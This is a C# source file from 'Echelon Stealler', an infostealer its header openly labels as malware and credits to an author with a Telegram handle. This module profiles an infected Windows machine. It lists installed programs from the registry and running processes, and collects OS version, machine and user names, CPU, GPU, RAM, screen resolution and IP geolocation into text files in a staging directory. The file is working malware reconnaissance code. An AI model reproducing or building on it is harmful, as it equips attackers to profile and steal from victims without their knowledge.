///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using System.Xml;

namespace Echelon
{
    class Systemsinfo
    {


        
        public static void ProgProc(string Echelon_Dir) 
        {
            PcInfo(Echelon_Dir);
            using (StreamWriter programmestext = new StreamWriter(Echelon_Dir + "\\Programms.txt", false, Encoding.Default))
            {
                try
                {
                    string displayName;
                    RegistryKey key;
                    key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall");
                    string[] keys = key.GetSubKeyNames();
                    for (int i = 0; i < keys.Length; i++)
                    {
                        RegistryKey subkey = key.OpenSubKey(keys[i]);
                        displayName = subkey.GetValue("DisplayName") as string;
                        if (displayName == null) continue;
                        programmestext.WriteLine(displayName);
                    }
                }
                catch 
                {
                }
            }
            try
            {
                using (StreamWriter processest = new StreamWriter(Echelon_Dir + "\\Processes.txt", false, Encoding.Default))
                {
                    Process[] processes = Process.GetProcesses();
                    for (int i = 0; i < processes.Length; i++)
                    {
                        processest.WriteLine(processes[i].ProcessName.ToString());
                    }
                }
            }
            catch 
            {
            }

        }

            public static string GpuName() //Получаем названия всех установленных видеокарт
        {
            try
            {
                string gpuName = string.Empty;
                string query = "SELECT * FROM Win32_VideoController";
                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
                { foreach (ManagementObject mObject in searcher.Get()) { gpuName += mObject["Description"].ToString() + " "; } }
                return (!string.IsNullOrEmpty(gpuName)) ? gpuName : "N/A";
            }
            catch  { return "Unknown"; }
        }



        public static string GetPhysicalMemory() // Получаем кол-во RAM Памяти в мб
        {
            try
            {
                ManagementScope scope = new ManagementScope();
            ObjectQuery query = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
            ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher(scope, query).Get();
            long num = 0L;
            foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
            {
                long num2 = Convert.ToInt64(((ManagementObject)managementBaseObject)["Capacity"]);
                num += num2;
            }
            num = num / 1024L / 1024L;
            return num.ToString();
            }
            catch  { return "Unknown"; }
        }


        public static string ProcessorId() // Получаем название процессора
        {
            try
            {
                ManagementObjectCollection instances = new ManagementClass("SELECT * FROM Win32_Processor").GetInstances();
                string result = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["ProcessorId"];
                }
                return result;
            }
            catch { return "Unknown"; }
        }


        public static string GetOSInformation() //Получаем инфу об ОС
        {
            foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get())
            {
                ManagementObject managementObject = (ManagementObject)managementBaseObject;
                try
                {
                    return string.Concat(new string[]
                    {
                    ((string)managementObject["Caption"]).Trim(),
                    ", ",
                    (string)managementObject["Version"],
                    ", ",
                    (string)managementObject["OSArchitecture"]
                    });
                }
                catch 
                {
                }
            }
            return "BIOS Maker: Unknown";
        }

       
        public static string GetComputerName() // Получаем имя ПК
        {
            try { 
            ManagementObjectCollection instances = new ManagementClass("Win32_ComputerSystem").GetInstances();
            string result = string.Empty;
            foreach (ManagementBaseObject managementBaseObject in instances)
            {
                result = (string)((ManagementObject)managementBaseObject)["Name"];
            }
            return result;
            }
            catch  { return "Unknown"; }

        }

        public static string GetProcessorName() // Получаем название процессора
        {
            try
            {
                ManagementObjectCollection instances = new ManagementClass("Win32_Processor").GetInstances();
                string result = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in instances)
                {
                    result = (string)((ManagementObject)managementBaseObject)["Name"];
                }
                return result;
            }
            catch  { return "Unknown"; }
        }



     
        // Записываем все полученные данные
        public static void PcInfo(string Echelon_Dir) 
        {

            ComputerInfo pc = new ComputerInfo();

            //Системное инфо

            Size resolution = Screen.PrimaryScreen.Bounds.Size; //getting resolution

            try
            {
                using (StreamWriter langtext = new StreamWriter(Echelon_Dir + "\\Info.txt", false, Encoding.Default))
                {
                    
                    langtext.WriteLine("OC verison - " + Environment.OSVersion + " | " + pc.OSFullName +
                        "\n" + "MachineName - " + Environment.MachineName + "/" + Environment.UserName +
                        "\n" + "Resolution - " + resolution +
                        "\n" + "Current time Utc - " + DateTime.UtcNow +
                        "\n" + "Current time - " + DateTime.Now +
                        "\n" + "CPU - " + GetProcessorName() +
                        "\n" + "RAM - " + GetPhysicalMemory() +
                        "\n" + "GPU - " + GpuName()+
                        "\n"+
                        "\n"+
                        "\n" + "IP Geolocation: " + Help.IP + " "+ Help.Country()

                        );

                    langtext.Close();

                }
            }
            catch 
            {

            }
        }
    }
}
